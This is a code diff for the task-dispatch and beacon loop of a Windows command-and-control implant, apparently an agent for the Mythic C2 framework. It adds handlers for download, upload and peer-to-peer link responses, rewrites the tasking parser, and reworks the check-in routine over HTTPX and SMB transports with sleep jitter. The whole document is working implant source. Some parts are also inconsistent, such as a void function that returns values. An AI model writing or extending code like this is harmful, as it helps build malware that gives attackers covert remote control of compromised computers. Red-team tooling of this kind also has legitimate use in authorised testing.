@@ -17,7 +17,7 @@
 #include "Tasks/Exit.h"
 
 /**
- * @brief @brief Dispatches and executes queued tasks from Mythic server.
+ * @brief @brief Process commands from GET_TASKING
 
  * @param [in] cmd Task command ID.
  * @param [in] taskUuid Mythic's UUID for tracking tasks.
@@ -26,6 +26,11 @@
  */
 VOID TaskDispatch(_In_ BYTE cmd, _In_ char* taskUuid, _In_ PPARSER taskParser) {
     switch (cmd) {
+        case NORMAL_RESP:
+        {
+            _dbg("NORMAL_RESP was called");
+            return;
+        }
 #ifdef INCLUDE_CMD_STATUS     // Built-in
         case STATUS_CMD:
         {
@@ -105,6 +110,12 @@ VOID TaskDispatch(_In_ BYTE cmd, _In_ char* taskUuid, _In_ PPARSER taskParser) {
             Download(taskUuid, taskParser);
             return;
         }
+        case DOWNLOAD_RESP:
+        {
+            _dbg("DOWNLOAD_RESP was called");
+            DownloadSync(taskUuid, taskParser);
+            return;
+        }
 #endif
 #ifdef INCLUDE_CMD_UPLOAD
         case UPLOAD_CMD:
@@ -112,39 +123,12 @@ VOID TaskDispatch(_In_ BYTE cmd, _In_ char* taskUuid, _In_ PPARSER taskParser) {
             _dbg("UPLOAD_CMD was called");
             Upload(taskUuid, taskParser);
             return;
-
-            // Freed inside of thread function
-            // TASK_PARAMETER* tp = (TASK_PARAMETER*)LocalAlloc(LPTR, sizeof(TASK_PARAMETER));
-            // if (!tp)
-            // {
-            //     _err("Failed to allocate memory for task parameter.");
-            //     return;
-            // }
-
-            // tp->TaskParser = (PPARSER)LocalAlloc(LPTR, sizeof(PARSER));
-            // if (!tp->TaskParser) {
-            //     _err("Failed to allocate memory for TaskParser.");
-            //     free(tp->TaskUuid);
-            //     LocalFree(tp);
-            //     return;
-            // }
-
-            // // Duplicate so we don't use values that are freed before the thread finishes
-            // tp->TaskUuid = _strdup(taskUuid);
-            // ParserNew(tp->TaskParser, taskParser->Buffer, taskParser->Length);
-
-            // // Threaded so it doesn't block main thread (usually needs alot of requests).
-            // HANDLE hThread = CreateThread(NULL, 0, UploadThread, (LPVOID)tp, 0, NULL);
-            // if (!hThread) {
-            //     _err("Failed to create upload thread");
-            //     free(tp->TaskUuid);
-            //     ParserDestroy(tp->TaskParser);
-            //     LocalFree(tp);
-            // } else {
-            //     CloseHandle(hThread); // Let the thread run independently
-            // }
-            
-            // return;
+        }
+        case UPLOAD_RESP:
+        {
+            _dbg("UPLOAD_RESP was called");
+            UploadSync(taskUuid, taskParser);
+            return;
         }
 #endif
 #ifdef INCLUDE_CMD_SHELL
@@ -243,6 +227,12 @@ VOID TaskDispatch(_In_ BYTE cmd, _In_ char* taskUuid, _In_ PPARSER taskParser) {
             Link(taskUuid, taskParser);
             return;
         }
+        case LINK_RESP:
+        {
+            _dbg("LINK_RESP was called");
+            LinkSync(taskUuid, taskParser);
+            return;
+        }
 #endif
 #ifdef INCLUDE_CMD_UNLINK
         case UNLINK_CMD:
@@ -269,6 +259,7 @@ BOOL TaskCheckin(PPARSER checkinResponseData)
     if (checkinByte != CHECKIN)
     {
         _err("CHECKIN byte 0x%x != 0xF1", checkinByte);
+        print_bytes(checkinResponseData->Buffer, checkinResponseData->Length);
         goto end;
     }
 
@@ -294,23 +285,68 @@ end:
     return bStatus;
 }
 
+// VOID TaskProcess(PPARSER tasks)
+// {
+//     // Determine the type of response from server (get_tasking, post_response, etc)
+//     BYTE typeResponse = ParserGetByte(tasks);
+    
+//     if (typeResponse != GET_TASKING)
+//     {
+//         _err("[NONE] Task not recognized!! Byte key -> %x\n\n", typeResponse);
+//         return;
+//     }
+
+//     UINT32 numTasks = ParserGetInt32(tasks);
+//     if ( numTasks ) {
+//         _dbg("[TASKING] Got %d tasks!", numTasks);
+//     }
+    
+//     for (UINT32 i = 0; i < numTasks; i++) 
+//     {       
+//         PARSER taskParser = { 0 };
+
+//         SIZE_T  sizeTask        = ParserGetInt32(tasks) - TASK_UUID_SIZE - 1;   // Subtract 36 (uuid) + 1 (task id)
+//         BYTE    taskId          = ParserGetByte(tasks);                         // Command ID
+//         SIZE_T  uuidLength      = TASK_UUID_SIZE;
+//         PCHAR   taskUuid        = ParserGetString(tasks, &uuidLength);          // Mythic task uuid
+//         PBYTE   taskBuffer      = ParserGetBytes(tasks, &sizeTask);             // Rest of data related to task
+        
+//         ParserNew(&taskParser, taskBuffer, sizeTask);
+        
+//         // Do the tasks synchronously 
+//         TaskDispatch(taskId, taskUuid, &taskParser);
+
+//         ParserDestroy(&taskParser);
+//     }
+// }
+
 VOID TaskProcess(PPARSER tasks)
 {
-    // Determine the type of response from server (get_tasking, post_response, etc)
-    BYTE typeResponse = ParserGetByte(tasks);
+    BYTE    Type        = NULL;
+    UINT32  NumOfMsgs   = 0;
+
+    if ( tasks->Buffer == NULL || tasks->Length == 0 )
+        return FALSE;
     
-    if (typeResponse != GET_TASKING)
+    // Determine the type of response from server (get_tasking, post_response, etc)
+    Type = ParserGetByte(tasks);
+    
+    if ( Type != GET_TASKING )
     {
-        _err("[NONE] Task not recognized!! Byte key -> %x\n\n", typeResponse);
+        _err("[NONE] Task not recognized!! Byte key -> %x\n\n", Type);
         return;
     }
 
-    UINT32 numTasks = ParserGetInt32(tasks);
-    if (numTasks) {
-        _dbg("[TASKING] Got %d tasks!", numTasks);
-    }
+    NumOfMsgs = ParserGetInt32(tasks);
+
+    _dbg("[Processing] Found %d Msgs in Response", NumOfMsgs);
+
+
+    if ( NumOfMsgs == 0 )
+        return TRUE;
+
     
-    for (UINT32 i = 0; i < numTasks; i++) 
+    for ( UINT32 i = 0; i < NumOfMsgs; i++ ) 
     {       
         PARSER taskParser = { 0 };
 
@@ -322,163 +358,100 @@ VOID TaskProcess(PPARSER tasks)
         
         ParserNew(&taskParser, taskBuffer, sizeTask);
         
-        // Do the task one-by-one, each cmd function handles responses
+        // Do the tasks synchronously 
         TaskDispatch(taskId, taskUuid, &taskParser);
 
         ParserDestroy(&taskParser);
     }
 }
 
-/** 
- * @brief Process the responses from Tasks
- * 
- * This is for tasks that require back n forth
- * e.g., download, upload, p2p
- */
-VOID TaskProcessResponses(PPARSER Response)
-{
-    BYTE   Status       = NULL;
-    UINT32 NumResponse  = 1;
-    
-    Status              = ParserGetByte(Response);          // I forget what this is
-
-    while ( Response->Length > 0 )
-    {
-        SIZE_T fidLen       = TASK_UUID_SIZE;
-        SIZE_T tidLen       = TASK_UUID_SIZE;
-        PCHAR  FileUuid     = NULL;
-        PCHAR  TaskUuid     = NULL;
-        BYTE   Type         = NULL;
-
-        Status              = ParserGetByte(Response);
-        Type                = ParserGetByte(Response);
-        TaskUuid            = ParserStringCopy(Response, &tidLen);
-
-        _dbg("[%s] Handling response # %d", TaskUuid, NumResponse);
-
-        if ( Type == NORMAL_RESP )
-        {
-            _dbg("NORMAL RESPONSE PACKET");
-            goto CLEANUP;
-        }
-
-#if defined(INCLUDE_CMD_DOWNLOAD)
-
-        if ( Type == DOWNLOAD_RESP )
-        {
-            _dbg("DOWNLOAD RESPONSE PACKET");
-
-            FileUuid = ParserStringCopy(Response, &fidLen);
-
-            if ( !DownloadSync(TaskUuid, FileUuid) ) 
-            {
-                _err("Failed to update download file ID.");
-            }
-        }
-
-#endif
-#if defined(INCLUDE_CMD_UPLOAD)
-
-        if ( Type == UPLOAD_RESP )
-        {
-            _dbg("UPLOAD RESPONSE PACKET");
-            
-            if ( !UploadSync(TaskUuid, Response) ) 
-            {
-                _err("Failed to sync file bytes.");
-            }
-        }
-
-#endif
-
-        /* P2P Details */
-
-CLEANUP:
-
-        /* Clean Up */
-        if (FileUuid) LocalFree(FileUuid);
-        if (TaskUuid) LocalFree(TaskUuid);
-
-        NumResponse++;
-    }
-    
-}
 
 VOID TaskRoutine()
 {
-/*
-    What if I refactor the task handler to loop through different 
-    "packages" and make delegates a package task. DELEGATE_FORWARD
-*/
+    /* 
+        TODO 
+        
+        Create a Task Routine that:
+            [x] Only sends 1 request per loop
+            - Will work for both HTTPX & SMB
+    */
+
+    /*
+        1. Send all packages
+
+            HTTPX    
+            a. PackageSendAll       - submit task results and get_tasking
+
+            SMB
+            a. PackageSendAll(NULL) - submit task results
+            b. SmbReceive           - get new tasks
+            c. PackageDecrypt       - decrypt output
+
+        2. Process response
+        3. Add p2p msgs
+        4. Add download chunks
+
+    */
 
 
-    /* Send Msgs from the Queue */
+    /* Send Msgs in the Queue */
+
     PARSER Output = { 0 };
+
+#ifdef HTTPX_TRANSPORT
+
     if ( PackageSendAll(&Output) )
     {
         if ( Output.Buffer != NULL )
         {
-            // _dbg("Response from PackageSendALL");
-            // print_bytes(Output.Buffer, Output.Length);
+            _dbg("Response from Mythic");
+            print_bytes(Output.Buffer, Output.Length);
 
-            TaskProcessResponses(&Output);
+            // TaskProcessResponses(&Output);
+
+            // TaskDispatch(&Output);
         }
     }
 
-    if (&Output != NULL) ParserDestroy(&Output);
+#endif
 
+#ifdef SMB_TRANSPORT
 
-    /* Ask server for new tasks */
-    PARSER   tasks   = { 0 };
-    PPackage req     = NULL;
-    
-    req = PackageInit(GET_TASKING, TRUE);
-    
-    PackageAddInt32(req, NUMBER_OF_TASKS);
+    PBYTE  pOutData = NULL;
+    SIZE_T OutLen   = 0;
 
-    BOOL bStatus = PackageSend(req, &tasks);
-    
-    if (bStatus == FALSE || tasks.Buffer == NULL)
-        goto CLEANUP;
-
-    /**
-     * TODO - Fix this as it breaks things that use PackageSend and process a response
-     * Such as:
-     *  Download
-     *  Upload
-     */
-
-
-    /* Check response for Delegate msgs */
-    BOOL isDelegates        = (BOOL)ParserGetByte(&tasks);
-    _dbg("isDelegates : %s", isDelegates ? "TRUE" : "FALSE");
-
-#if defined(INCLUDE_CMD_LINK)
-
-    PCHAR  P2pUuid          = NULL;
-    PCHAR  P2pMsg           = NULL;
-    SIZE_T P2pIdLen         = 0;
-    SIZE_T P2pMsgLen        = 0;
-    UINT32 NumOfDelegates   = 0;
-    if ( isDelegates ) 
+    if ( PackageSendAll(NULL) )
     {
-        NumOfDelegates  = ParserGetInt32(&tasks);
-        P2pUuid         = ParserGetString(&tasks, &P2pIdLen);
-        P2pMsg          = ParserGetString(&tasks, &P2pMsgLen);
+        if ( SmbRecieve(&pOutData, &OutLen) )
+        {
+            if ( pOutData != NULL && OutLen != 0 )
+            {
+                ParserNew(&Output, pOutData, OutLen);
 
-        _dbg("Package should contain : %d msgs.", NumOfDelegates);
-        _dbg("P2P New UUID           : %s", P2pUuid);
-        _dbg("P2P Raw Msg %d bytes   : %s", P2pMsgLen, P2pMsg);
-        /* Forward msg to intended Linked Agent */
-        LinkForward( P2pMsg, P2pMsgLen );
+                ParserDecrypt(&Output);
+
+                print_bytes(Output.Buffer, Output.Length);
+
+                // TaskProcessResponses(&Output);
+            }
+        }
     }
 
 #endif
 
 
-    /* Process all tasks */
-    TaskProcess(&tasks);
+    /* Handle all those resposnes */
 
+    if ( Output.Buffer != NULL && Output.Length != 0 )
+    {
+        
+        TaskProcess(&Output);
+    }
+
+
+
+    if (&Output != NULL) ParserDestroy(&Output);
+    
 
     /* Check all Links and push delegates to Server */
 #if defined(INCLUDE_CMD_LINK)
@@ -496,9 +469,6 @@ VOID TaskRoutine()
 
 
 CLEANUP:
-    // Cleanup
-    if (req != NULL) PackageDestroy(req);
-    if (&tasks != NULL) ParserDestroy(&tasks);
 
     // zzzz
     SleepWithJitter(xenonConfig->sleeptime, xenonConfig->jitter);
